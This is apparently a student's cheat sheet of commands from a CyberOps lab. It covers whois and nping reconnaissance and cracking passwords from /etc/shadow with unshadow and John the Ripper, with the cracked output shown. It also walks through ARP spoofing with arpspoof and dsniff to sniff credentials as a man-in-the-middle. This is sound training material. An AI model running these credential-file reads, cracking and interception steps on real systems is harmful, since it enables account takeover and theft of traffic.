# CyberOps commands

Footprinting:
* `whois -H cisco.com | more`

Fingerprinting:
* `nping --tcp -p 22 10.10.6.1`

Access Attack Exploit Tools:
* Ncrack
* Aircrack-ng
* CeWL
* Crunch
* Medusa
* RainbowCrack
* John the Ripper:
  <pre>
  root@kali-1:~# <b>unshadow</b>
  Usage: unshadow PASSWORD-FILE SHADOW-FILE
  root@kali-1:~# <b>unshadow /etc/passwd /etc/shadow > pass.txt</b>
  root@kali-1:~# <b>john --wordlist=/usr/share/john/password.lst pass.txt</b>
  Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
  Use the "--format=crypt" option to force loading these as that type instead
  Using default input encoding: UTF-8
  Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
  Press 'q' or Ctrl-C to abort, almost any other key for status
  <b>test             (root)</b>
  <b>test             (admin)</b>
  2g 0:00:00:01 DONE (2018-08-25 22:28) 1.086g/s 139.1p/s 278.2c/s 278.2C/s lacrosse..franklin
  Use the "--show" option to display all of the cracked passwords reliably
  Session completed
  </pre>

ARP Cache Poisoning
* `arpspoof -t 10.10.6.10 10.10.6.1` command, which will send a stream of ARP replies to 10.10.6.10 (Victim), spoofing
10.10.6.1 (the default gateway), and providing MITM's MAC address in the spoofed ARP replies.
The default gateway's ARP cache can also be poisoned, but this "half-duplex" poisoning is sufficient.
Return to the MITM desktop. Open a second terminal window and enter the `dsniff -c` command to start
dsniff in half duplex mode.
To allow the traffic that is intended for 10.10.6.1 that is forwarded to the MITM MAC address to be
forwarded to the real gateway, open a third terminal window. Use the `sysctl -w net.ipv4.ip_forward=1`
command to enable IP forwarding on MTIM machine.